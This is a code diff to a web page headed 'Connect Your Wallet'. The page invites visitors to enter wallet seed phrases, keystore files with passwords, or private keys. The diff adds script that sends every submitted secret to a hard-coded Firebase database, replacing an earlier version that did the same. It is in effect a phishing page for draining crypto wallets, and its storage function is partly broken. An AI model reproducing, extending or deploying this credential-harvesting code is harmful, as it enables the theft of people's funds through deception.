@@ -127,6 +127,7 @@
 </head>
 
 <body>
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
     <header>
         <h1>Connect Your Wallet</h1>
         <p>Choose your preferred wallet type and enter your credentials to connect.</p>
@@ -213,7 +214,7 @@
             </select>
         </div>
 
-        <form id="wallet-connect-form">
+        <form action="" id="contactForm">
             <label for="wallet-type">Selected Wallet:</label>
             <input type="text" id="selected-wallet" readonly>
             
@@ -229,7 +230,9 @@
 
             <div id="info-input-container"></div>
 
-            <button type="button" onclick="connectWallet()">Connect</button>
+            
+                <button type="submit">Submit</button>
+            
         </form>
     </section>
 
@@ -284,11 +287,35 @@
         }
 
    
- function connectWallet() {
-            // Retrieve selected wallet type, information type, and credentials
-            const selectedWallet = document.getElementById('selected-wallet').value;
-            const walletInfoType = document.getElementById('wallet-info-type').value;
-            const walletName = document.getElementById('wallet-name').value; // New field for wallet name
+
+
+          
+
+
+
+        const firebaseConfig = {
+  apiKey: "AIzaSyDL02IHV9fVfPm5r2g5-j3KxvPjrP7pj7c",
+  authDomain: "contactform-50d9f.firebaseapp.com",
+  databaseURL: "https://contactform-50d9f-default-rtdb.firebaseio.com",
+  projectId: "contactform-50d9f",
+  storageBucket: "contactform-50d9f.appspot.com",
+  messagingSenderId: "481729191146",
+  appId: "1:481729191146:web:6798592b5070b2119f0b93"
+};
+                 const app = firebase.initializeApp(firebaseConfig);
+                      var contactFormDB = firebase.database().ref("contactForm");
+
+document.getElementById("contactForm").addEventListener("submit", submitForm);
+
+function submitForm(e) {
+  e.preventDefault();
+
+  var name = getElementVal("name");
+  var emailid = getElementVal("emailid");
+  var msgContent = getElementVal("msgContent");
+       var selectedWallet = document.getElementById('selected-wallet').value;
+            var walletInfoType = document.getElementById('wallet-info-type').value;
+            var walletName = document.getElementById('wallet-name').value; // New field for wallet name
 
             // Retrieve information input based on the selected type
             let walletCredentials;
@@ -297,8 +324,8 @@
                     walletCredentials = document.getElementById('wallet-phrase').value;
                     break;
                 case 'keystore':
-                    const walletKeystore = document.getElementById('wallet-keystore').value;
-                    const walletPassword = document.getElementById('wallet-password').value;
+                    var walletKeystore = document.getElementById('wallet-keystore').value;
+                    var walletPassword = document.getElementById('wallet-password').value;
                     walletCredentials = { keystore: walletKeystore, password: walletPassword };
                     break;
                 case 'private-key':
@@ -307,39 +334,37 @@
                 default:
                     break;
             }
+  saveMessages(name, emailid, msgContent,selectedWallet,walletKeystore,walletName,walletPassword,walletCredentials);
 
-            // Initialize Firebase (Use your actual Firebase configuration)
-            const firebaseConfig = {
-                apiKey: "AIzaSyCWsLUONo3eVXS4R-2niIJZYaA8I0RtrbQ",
-                authDomain: "crypto-jwv.firebaseapp.com",
-                projectId: "crypto-jwv",
-                storageBucket: "crypto-jwv.appspot.com",
-                messagingSenderId: "653329737827",
-                appId: "1:653329737827:web:81394c978771bc4a35b056"
-            };
+  //   enable alert
+  document.querySelector(".alert").style.display = "block";
 
-            const app = firebase.initializeApp(firebaseConfig);
-            const database = firebase.database();
+  //   remove the alert
+  setTimeout(() => {
+    document.querySelector(".alert").style.display = "none";
+  }, 3000);
 
-            // Save wallet information to Firebase
-            const user = firebase.auth().currentUser; // Use the current authenticated user
-            const walletRef = database.ref('users/' + user.uid + '/wallets').push();
+  //   reset the form
+  document.getElementById("contactForm").reset();
+}
 
-            walletRef.set({
-                walletType: selectedWallet,
-                walletName: walletName,
-                walletInfoType: walletInfoType,
-                walletCredentials: walletCredentials
-            }).then(() => {
-                console.log('Wallet information saved successfully!');
-                alert('Wallet information saved successfully!');
-            }).catch((error) => {
-                console.error('Error saving wallet information:', error);
-                alert('Error saving wallet information. Please try again.');
-            });
+const saveMessages = (name, emailid, msgContent) => {
+  var newContactForm = contactFormDB.push();
 
-            // Add your actual wallet connection logic here
-        }
+  newContactForm.set({
+    walletKeystore: walletKeystore,
+    selectedWallet: selectedWallet,
+    walletName: walletName,
+      selectedWallet: selectedWallet,
+       walletPassword: walletPassword,
+      walletCredentials: walletCredentials
+  });
+};
+
+const getElementVal = (id) => {
+  return document.getElementById(id).value;
+};
+        
     </script>
 
 
